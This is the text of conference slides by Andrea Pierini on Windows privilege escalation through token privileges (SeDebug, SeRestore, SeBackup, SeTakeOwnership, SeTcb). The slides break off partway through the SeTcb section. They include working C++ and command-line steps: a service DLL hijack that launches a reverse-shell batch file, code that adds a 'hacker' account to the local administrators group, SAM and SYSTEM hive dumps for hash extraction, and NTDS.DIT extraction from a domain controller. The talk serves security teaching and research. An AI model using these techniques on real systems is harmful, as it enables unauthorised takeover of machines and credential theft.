1
[show me your privileges and I will lead you to SYSTEM]
Andrea Pierini, Paris, June 19th 2019
2
dir /a /r %USERPROFILE%
➔ Cyclist & Scuba Diver, Father & Husband
➔ IT Architect & Security Manager
➔ Long time experience 
➔ InfoSec addicted
➔ Windows Server & Linux 
“early adopter”
“whoami /priv” - Andrea Pierini 
@decoder_it | PI:EMAIL | https://decoder.cloud | https://github.com/decoder-it
Cyber Saiyan
Member of:
3
dir /a /r %USERPROFILE%
➔ Cyclist & Scuba Diver, Father & Husband
➔ IT Architect & Security Manager
➔ Long time experience 
➔ InfoSec addicted
➔ Windows Server & Linux 
“early adopter”
“whoami /priv” - Andrea Pierini 
@decoder_it | PI:EMAIL | https://decoder.cloud | https://github.com/decoder-it
Cyber Saiyan
The good old days…
Member of:
4
Why this talk
➔ Escalating privileges via “Windows Privilege abusing” & “Token manipulation” 
techniques are often not considered and/or misunderstood
➔ Some Windows privilege manipulations techniques are not well documented
➔ So I decided to dig deeper…
➔ “Abusing Token Privileges For Windows Local Privilege Escalation “(Bryan Alexander 
& Stephen Breen) a great article which inspired me a lot!
“whoami /priv” - Andrea Pierini 
5
Agenda
➔ Intro to Windows Privileges & Tokens
➔ How to get them?
➔ Interesting privileges for escalation:
◆ SeDebug
◆ SeRestore & SeBackup & SeTakeOwnership
◆ SeTcb & SeCreateToken
◆ SeLoadDriver
◆ SeImpersonate & SeAssignPrimaryToken
 From “Rotten Potato” to “Juicy Potato”
 Prevention
➔ Final thoughts
“whoami /priv” - Andrea Pierini 
6
What are Windows Privileges?
➔ “A privilege is the right of an account, such as a user or group account, to perform 
various system-related operations on the local computer, such as shutting down the 
system, loading device drivers, or changing the system time” (msdn.microsoft.com)
➔ Some Users/Groups have predefined privileges
➔ Privileges are managed through the “User Right Assignment” of the Local Policies, 
but you can play with them using the Windows API’s too
➔ Some privileges can override permissions set on an object
➔ Some privileges assigned to users are only available in an High IL Process (elevated 
shell)
➔ whoami /priv will list your privileges
“whoami /priv” - Andrea Pierini 
7
What is a Windows Access Token?
➔ It’s an object that describes the security context of a process or thread
➔ Generated by the system during the logon process (NtCreateToken)
➔ Is used when a process or thread tries to interact with objects that have security 
descriptors (securable objects) or wants to perform tasks which requires adequate 
privileges
➔ Upon the creation of a process or thread, a copy of the token will be assigned to 
them
“whoami /priv” - Andrea Pierini 
8
What is a Windows Access Token?
➔ A Token contains:
◆
SID of the user, owner
◆
SID's for the groups of which the user is a member
◆
Logon SID 
◆
List of privileges held by either the user or the user's groups
◆
Owner SID
◆
SID for the primary group
◆
DACL that the system uses when the user creates a securable object without specifying a security descriptor
◆
Source of the access token
◆
Token type (Primary or Impersonation)
◆
Optional list of restricting SIDs
◆
Current impersonation levels (SecurityAnonymous,SecurityIdentification,SecurityImpersonation,SecurityDelegation)
◆
Other statistics..
➔ Once a token is set (PrimaryTokenFrozen bit), you cannot add new privileges to the 
token, only enable or disable privileges that already exist on that token 
(AdjustTokenPrivileges).
➔ You can change the Token type  (DuplicateToken)
“whoami /priv” - Andrea Pierini 
9
Which accounts have special privileges?
➔ Administrators, Local System 
➔ Some built-in groups (Backup, Server, Printer Operators) 
➔ Local/network service accounts
➔ Managed Service and Virtual Accounts
➔ Third party application users
➔ Misconfigured users
“whoami /priv” - Andrea Pierini 
10
Which accounts have special privileges?
“whoami /priv” - Andrea Pierini 
11
Hunting “privileged” accounts
➔ Compromising the service 
◆
Weak service configuration
◆
Web -> RCE
◆
MSSQL ->SQLI -> xp_cmdshell
➔ Intercepting NTLM authentication (Responder)
➔ Stealing Credentials
➔ Kerberoasting
➔ ...
“whoami /priv” - Andrea Pierini 
12
Obtaining privileges & manipulating tokens through 
“exploits”
➔ NULL ACL strategy (https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)
➔ Replacing a  process token with a SYSTEM token
➔ Partial Writes (https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
◆
MS16-135
◆
MS15-061
➔ Arbitrary Writes (https://www.greyhathacker.net/?p=1025)
◆
CVE-2018-15732 (STOPzilla AntiMalware)
“whoami /priv” - Andrea Pierini 
13
SeDebugPrivilege
➔ “Allows the user to attach a debugger to any process.”
➔ This privilege permits read/write memory and change properties of any process 
(including Local System, administrator...) 
➔ Inject code into privileged processes in order to perform privileged tasks (well-known 
various techniques, VirtualAlloc(), WriteProcessMemory(), CreateRemoteThread()..)
“whoami /priv” - Andrea Pierini 
14
SeDebugPrivilege
“whoami /priv” - Andrea Pierini 
UpdateProcThreadAttribute(
si.lpAttributeList,
0,
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
lpProcThreadHandle,
(IntPtr)IntPtr.Size,
IntPtr.Zero,
IntPtr.Zero);
➔ Create a new process and set the parent process a privileged process 
◆
https://github.com/decoder-it/psgetsystem
15
➔ “Allows a user to circumvent file and directory permissions when restoring backed-up 
files and directories“ (but also registry keys)
➔ 2 Api Calls, countless possibilities:
◆
CreateFile() with FILE_FLAG_BACKUP_SEMANTICS option
◆
RegCreateKeyEx() with REG_OPTION_BACKUP_RESTORE option
➔ Can write files anywhere, overwrites files, protected system files - even those 
protected by TrustedInstaller,  registry entries…
➔ What else do you need ?
SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
16
➔ Example: Modify a service running as Local System and startable by all users and 
get a SYSTEM shell
SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
17
➔ Create a Service DLL
SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
(...)
hServiceStatusHandle = RegisterServiceCtrlHandlerW(L"dmwappushservice",(LPHANDLER)MyHandler);
if (hServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
{
Log("Registering Control Handler failed\n");
return;
}
ServiceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
(...)
STARTUPINFO si;
PROCESS_INFORMATION pi;
ZeroMemory(&pi, sizeof(pi));
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
if (!CreateProcess(L"c:\\temp\\reverse.bat", NULL, NULL, NULL, 0, 0, NULL, NULL, &si, &pi))
Log("Create Process failed\n");
18
SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
➔ Overwrite Service config in Registry
std::string buffer="c:\\windows\\system32\\hackerservice.dll"
LSTATUS stat = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
"SYSTEM\\CurrentControlSet\\Services\\dmwappushservice\\Parameters",
0,
NULL,
REG_OPTION_BACKUP_RESTORE,
KEY_SET_VALUE,
NULL,
&hk,
NULL);
stat = RegSetValueExA(hk, "ServiceDLL", 0, REG_EXPAND_SZ, 
(const BYTE*)buffer.c_str(), buffer.length() + 1);
19
SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
➔ “Copy” service dll in c:\windows\system32
LPCWSTR fnamein = L"c:\\temp\\hackerservice.dll";
LPCWSTR fnameout = L"c:\\windows\\system32\\hackerservice.dll";
//LPCWSTR fnameout = L"c:\\windows\\system32\\dmwappushsvc.dll";
source = CreateFile(fnamein, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
GetFileSizeEx(source, &iSize);
dest = CreateFile(fnameout,
GENERIC_WRITE, 
FILE_SHARE_WRITE, 
NULL, 
CREATE_ALWAYS, 
FILE_FLAG_BACKUP_SEMANTICS,
NULL);
ReadFile(source, buf, iSize.QuadPart, &bytesread, NULL);
WriteFile(dest, buf, bytesread, &byteswritten, NULL);
CloseHandle(dest);
CloseHandle(source);
Video
20
SeBackupPrivilege
➔ “Allows the user to circumvent file and directory permissions to backup the system. 
The privilege is selected only when the application attempts to access through the 
NTFS backup application interface. Otherwise normal file and directory permissions 
apply.”
➔ With this  privilege you can easily backup Windows registry and use third party tools 
for extracting local NTLM hashes
◆
reg save HKLM\SYSTEM c:\temp\system.hive
◆
Reg save HKLM\SAM c:\temp\sam.hive
“whoami /priv” - Andrea Pierini 
21
SeBackupPrivilege
➔ You can also read files which normally you could not access
“whoami /priv” - Andrea Pierini 
LARGE_INTEGER iSize;
source = 
CreateFile(L"c:\\users\\administrator\\supersecretfile4admins.doc", 
GENERIC_READ, 0,  
NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
if (stat != ERROR_SUCCESS) {
printf("Failed opening");
exit(EXIT_FAILURE);
}
GetFileSizeEx(source, &iSize);
void *buf= malloc(iSize.QuadPart);
ReadFile(source, buf, iSize.QuadPart, &bytesread, NULL);
(..)
22
SeBackupPrivilege
➔ Members of “Backup Operators” can logon locally on a Domain Controller and 
backup the NTDS.DIT, for ex. with: “wbadmin.exe”  or “diskshadow.exe”
“whoami /priv” - Andrea Pierini 
c:\>wbadmin start backup -backuptarget:e: -include:c:\windows\ntds
c:\>wbadmin get versions
c:\>wbadmin start recovery -version:07/12/2018-11:09 -itemtype:file
-items:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp\srvdc1 -notrestoreacl
c:\>reg save HKLM\SYSTEM c:\temp\srvdc1\system
23
SeBackupPrivilege
➔ Members of “Backup Operators” can logon locally on a Domain Controller and 
backup the NTDS.DIT, for ex. with: “wbadmin.exe”  or “diskshadow.exe”
“whoami /priv” - Andrea Pierini 
c:\>wbadmin start backup -backuptarget:e: -include:c:\windows\ntds
c:\>wbadmin get versions
c:\>wbadmin start recovery -version:07/12/2018-11:09 -itemtype:file
-items:c:\windows\ntds\ntds.dit -recoverytarget:c:\temp\srvdc1 -notrestoreacl
c:\>reg save HKLM\SYSTEM c:\temp\srvdc1\system
c:\temp\srvc1>myenablepriv.exe 1088 SeBackupPrivilege
c:\temp\srvc1>type script.txt
set metadata C:\temp\srvdc1\metadata.cab
set context clientaccessible
set context persistent
begin backup
add volume c: alias mydrive
create
expose %mydrive% z:
c:\temp\srvdc1\>diskshadow /s script.txt
c:\temp\srvdc1\>mybackuprestore.exe backup z:\windows\ntds\ntds.dit c:\temp\srvdc1\ntds.dit
24
SeBackupPrivilege & SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
If you have SeBackup & SeRestore privileges
(Backup Operators group) you can set permission
and ownership on each file & folder
25
SeBackupPrivilege & SeRestorePrivilege
“whoami /priv” - Andrea Pierini 
If you have SeBackup & SeRestore privileges
(Backup Operators group) you can set permission
and ownership on each file & folder
26
➔ “Allows the user to take ownership of any securable object in the system”
➔ 2 API Calls: 
◆
SetSecurityInfo()
◆
SetNamedSecurityInfo()
➔ Various objects (SE_OBJECT_TYPE): Files, Printers, Shares, Services, Registry, 
Kernel objects..
➔ Once gained ownership, same techniques as in SeRestorePrivilege apply
➔ Example: altering the “msiserver” service…
SeTakeOwnershipPrivilege
“whoami /priv” - Andrea Pierini 
27
➔ Step 1:  Take ownership of the service registry key
SeTakeOwnershipPrivilege
(...)
wchar_t infile[] = L"SYSTEM\\CurrentControlSet\\Services\\msiserver";
PSID UserSid=GetCurrentUserSID();
dwRes = SetNamedSecurityInfoW(
infile,             
SE_REGISTRY_KEY,
OWNER_SECURITY_INFORMATION,   
UserSid, NULL,                  
NULL,                        
NULL);                      
(...)
“whoami /priv” - Andrea Pierini 
28
➔ Step 2: Change Permissions on Registry Key .. and profit ;-)
SeTakeOwnershipPrivilege
(...)
PSID pSIDEveryone = NULL;
PACL pACL;
SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
SECURITY_WORLD_SID_AUTHORITY;
AllocateAndInitializeSid(&SIDAuthWorld, 1,
SECURITY_WORLD_RID,
0,
0, 0, 0, 0, 0, 0,
&pSIDEveryone)
EXPLICIT_ACCESS ea[NUM_ACES];
ea[0].grfAccessPermissions = KEY_ALL_ACCESS;
ea[0].grfAccessMode = SET_ACCESS;
ea[0].grfInheritance = NO_INHERITANCE;
ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea[0].Trustee.TrusteeType = 
TRUSTEE_IS_WELL_KNOWN_GROUP;
ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;
SetEntriesInAcl(NUM_ACESS,ea,NULL,&pACL)
(...)
(...)
wchar_t infile[] = 
L"SYSTEM\\CurrentControlSet\\Services\\
\\msiserver";
dwRes = SetNamedSecurityInfoW(
infile,                
SE_REGISTRY_KEY,             
DACL_SECURITY_INFORMATION,  
NULL, NULL,                 
pACL,                       
NULL);
(...)
std::string buffer= "cmd.exe /c net localgroup
administrators hacker /add";
stat = RegSetValueExA(hk, "ImagePath", 0, 
REG_EXPAND_SZ, 
(const BYTE*)buffer.c_str(), 
buffer.length() + 1);
(...)
“whoami /priv” - Andrea Pierini 
29
➔ “Act as part of the operating system”.  (1) “Allows a process to assume the identity of 
any user and thus gain access to the resources that the user is authorized to access. 
“ (2) “The calling process may request that arbitrary additional accesses be put in the 
access token”. 
➔ (1) - S4U Logon: Service For User Logon. This service allows a user with SeTcb
privilege to logon as a different user without any credentials in order to get a security 
Impersonation Token by using the LsaLogonUser() function  
➔ (2) - For example, the PTOKEN_GROUPS parameter in LsaLogonUser() can be 
modified 
SeTcbPrivilege
“whoami /priv” - Andrea Pierini 
30
➔ The impersonation Token, valid only in local machine context,  obtained by 
LsaLogonUser() can be used to impersonate threads or processes, but we don’t have 
SeImpersonate or SeAsssignPrimary privilege….
➔ “SeImpersonate privilege is not needed for impersonating a thread as long as the 
token is for the same user and the integrity level is less or equal to the current 
process integrity level” (MS added other “constraints” starting from Win 10)
SeTcbPrivilege
“whoami /priv” - Andrea Pierini 
31
➔ The impersonation Token, valid only in local machine context,  obtained by 
LsaLogonUser() can be used to impersonate threads or processes, but we don’t have 
SeImpersonate or SeAsssignPrimary privilege….